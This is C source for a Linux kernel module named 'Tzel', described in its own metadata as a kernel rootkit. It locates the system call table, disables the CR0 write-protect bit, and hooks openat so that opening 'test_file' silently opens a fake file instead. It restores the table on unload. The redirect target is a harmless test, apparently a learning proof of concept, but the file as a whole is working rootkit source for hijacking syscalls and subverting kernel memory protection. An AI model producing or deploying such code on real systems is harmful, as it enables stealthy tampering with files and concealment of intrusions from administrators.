#include <asm/paravirt.h>
#include <asm/segment.h>
#include <asm-generic/unistd.h>
#include <linux/dirent.h>
#include <linux/fcntl.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/version.h>

static unsigned long *sys_call_table;
static unsigned long orig_sys_call_table[__NR_syscalls] = { 0 };
extern unsigned long __force_order;

static inline void write_cr0_forced(unsigned long val)
{
    asm volatile("mov %0,%%cr0": "+r" (val), "+m" (__force_order));
}

static inline void unprotect_memory(void)
{
    write_cr0_forced(read_cr0() & ~X86_CR0_WP);
}

static inline void protect_memory(void)
{
    write_cr0_forced(read_cr0() | X86_CR0_WP);
}

static void hook_syscall(unsigned int syscall_num, unsigned long hook)
{
    printk(KERN_INFO "Hooking...\n");

    printk(KERN_INFO "Original address: %lx\n", sys_call_table[syscall_num]);
    printk(KERN_INFO "Fake address: %lx\n", hook);

    unprotect_memory();

    orig_sys_call_table[syscall_num] = sys_call_table[syscall_num];
    sys_call_table[syscall_num] = hook;

    protect_memory();

    printk(KERN_INFO "New address: %lx\n", sys_call_table[syscall_num]);
}

static void unhook_all(void)
{
    int i;

    unprotect_memory();

    for (i = 0; i < __NR_syscalls; i++)
        if (orig_sys_call_table[i]) 
            sys_call_table[i] = orig_sys_call_table[i];

    protect_memory();
}

asmlinkage int sys_openat_hijack(int dirfd, const char __user *pathname, int flags) 
{ 
    int (*orig)(int, const char __user *, int) = 
        (int (*)(int, const char __user *, int))(sys_call_table[__NR_openat]);

    const char * orig_file = "test_file";
    const char * fake_file = "./test_file_fake";

    if (strstr(pathname, orig_file))
    {
        return (*orig)(dirfd, fake_file, flags);
    }    
 
    return (*orig)(dirfd, pathname, flags);
}

static int __init init_rootkit(void)
{
    printk(KERN_INFO "Loading Tzel.\n");

    sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
    
    printk(KERN_INFO "sys_call_table address: %px\n", sys_call_table);

    hook_syscall(__NR_openat, (unsigned long)sys_openat_hijack);

    return 0;
}

static void __exit cleanup_rootkit(void)
{
    printk(KERN_INFO "Cleaning up Tzel.\n");
    unhook_all();
}  

module_init(init_rootkit);
module_exit(cleanup_rootkit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Pedro Peck");
MODULE_DESCRIPTION("Kernel rootkit");
